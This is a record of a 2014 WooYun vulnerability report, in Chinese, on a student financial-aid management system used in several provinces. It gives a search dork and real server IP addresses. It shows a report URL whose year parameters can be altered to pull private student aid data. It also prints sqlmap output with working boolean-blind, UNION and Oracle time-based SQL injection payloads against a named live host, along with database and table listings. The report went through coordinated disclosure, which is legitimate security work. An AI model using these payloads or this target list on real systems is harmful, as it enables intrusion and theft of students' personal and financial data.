{"id": 49954, "wybug_id": "wooyun-2014-079504", "wybug_title": "某多省在用资助管理系统存在SQL注入漏洞+信息泄露合集  #2", "wybug_corp": "资助管理系统", "wybug_author": "黑暗游侠", "wybug_date": "2014-10-15 17:42", "wybug_open_date": "2015-01-13 17:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向公众公开  简要描述： 某多省在用资助管理系统存在SQL注入漏洞+信息泄露合集  #2 详细说明：  多省在用，省级系统，影响会很大，涉及金融业务   漏洞证明：  这个算#1吧\nhttp://wooyun.org/bugs/wooyun-2010-071139\n来提交第2发介绍啥的我就把前辈的直接复制过来了dork：infoms/identity/index.c南京君度科技有限公司部分例子http://220.178.0.180/infoms/identity/index.chttp://218.76.27.109/infoms/identity/index.chttp://aid.ec.js.edu.cn/infoms/identity/index.chttp://202.119.175.107/infoms/identity/index.chttp://58.213.129.204/infoms/这个漏洞既泄露了大量数据信息，又存在sql注入，算是个二合一了通用URL：http://ip:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm='320001323001'&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'存在注射参数：gzbm例如：\nhttp://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm='320001323001'&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'\n\nhttp://202.119.175.107:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm='320001323001'&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'\n所有学生资助隐私直接泄露！！！！\n\n而且通过改变年份参数可以遍历所有数据，比如：\nhttp://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm='320001323001'&sqnd='2014'&nd='2014'&bbnd='2014'&tbnd='2014'&jd='2'\n\nhttp://202.119.175.107:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm='320001323001'&sqnd='2014'&nd='2014'&bbnd='2014'&tbnd='2014'&jd='2'\n好了数据泄露看完继续看SQL注入之前已经说了gzbm参数存在注射\nhttp://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm=320001323001*&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1' (GET)\n\n---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm=320001323001 AND 9906=9906&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: http://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm=320001323001 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(120)||CHR(108)||CHR(113)||CHR(102)||CHR(99)||CHR(112)||CHR(87)||CHR(87)||CHR(89)||CHR(84)||CHR(69)||CHR(75)||CHR(120)||CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- &sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: http://58.213.129.204:8081/runqianReport/reportJsp/showReport.jsp?raq=/gzzxjmxb.raq&gzbm=-5248 OR 7763=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(67)||CHR(87)||CHR(69),5)&sqnd='2012'&nd='2012'&bbnd='2012'&tbnd='2012'&jd='1'---web application technology: JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---web application technology: JSPback-end DBMS: Oracle\n数据库：\navailable databases [20]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] USR_JCMS[*] USR_JIANGSU[*] USR_LOAN[*] USR_LOAN_TEST[*] USR_ZJ[*] VIDEO[*] WMSYS[*] XDB\n当前数据库存在600多个表，举一部分：\nDatabase: USR_LOAN[624 tables]+-------------------------------+| A_JS_XQ                       || A_T_SYS_MENU                  || A_XQ_1                        || A_XQ_DEPART                   || A_XQ_XIUGAI                   || A_XQ_ZXJHZ_20140306           || A_XQ_ZXJ_20140306             || CHESSSS                       || CISHI                         || DCJY_TEMP                     || DONKEY_JBXX_TEMP1             || DONKEY_JBXX_TEMP1111          || DONKEY_JBXX_TEMP3             || DONKEY_JBXX_TEMP_BCXX         || DONKEY_JBXX_USER              || DONKEY_JBXX_USER1             || DONKEY_SYS_DEPART             || DONKEY_T_SXKP_JFZC            || DONKEY_ZXJSQ_TEMP             |\n数据应该存在t_gz_zxjsq表中根据不同省份平台有等量数据但是至少一个平台100W数据还是有的   修复方案：  加急   版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-10-20 09:59 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}